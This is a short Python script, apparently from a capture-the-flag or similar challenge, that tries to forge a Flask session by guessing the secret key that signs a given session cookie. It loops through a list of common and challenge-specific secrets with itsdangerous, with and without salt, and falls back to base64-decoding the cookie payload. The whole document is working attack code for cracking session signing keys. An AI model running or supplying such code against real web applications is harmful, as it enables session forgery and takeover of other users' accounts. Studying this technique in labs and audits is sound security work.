import requests, json, base64, hmac, hashlib, itsdangerous
from itsdangerous import URLSafeTimedSerializer, Signer

# Let's test if we can forge session with common secret keys
session_cookie = 'eyJ1c2VybmFtZSI6InRlc3R1c2VyMSJ9.aj61Dw.YpGomJCF5SZ8f542b3RoT36tqvM'
common_secrets = ['secret', 'key', 'flask-secret', 'super-secret', 'change-me', 'cheese', 'tomandjerry', 'tom', 'jerry', 'lucky-draw', 'tomjerry']

for secret in common_secrets:
    s = URLSafeTimedSerializer(secret, salt='cookie-session', signer_kwargs={'key_derivation': 'hmac'})
    try:
        data = s.loads(session_cookie)
        print(f'Found secret: {secret}')
        print(f'Data: {data}')
        break
    except:
        pass
else:
    # Try without salt
    for secret in common_secrets:
        s = URLSafeTimedSerializer(secret, signer_kwargs={'key_derivation': 'hmac'})
        try:
            data = s.loads(session_cookie)
            print(f'Found secret (no salt): {secret}')
            print(f'Data: {data}')
            break
        except:
            pass
    else:
        print('Secret not found in common list')
        print('Trying to decode payload manually...')
        from flask.sessions import SecureCookieSessionInterface
        # Try with different signers
        from itsdangerous import URLSafeTimedSerializer, TimestampSigner, BadSignature
        payload, timestamp, sig = session_cookie.split('.')
        print(f'Payload: {payload}')
        padded = payload + '=' * (4 - len(payload) % 4) if len(payload) % 4 else payload
        print(f'Decoded: {base64.urlsafe_b64decode(padded)}')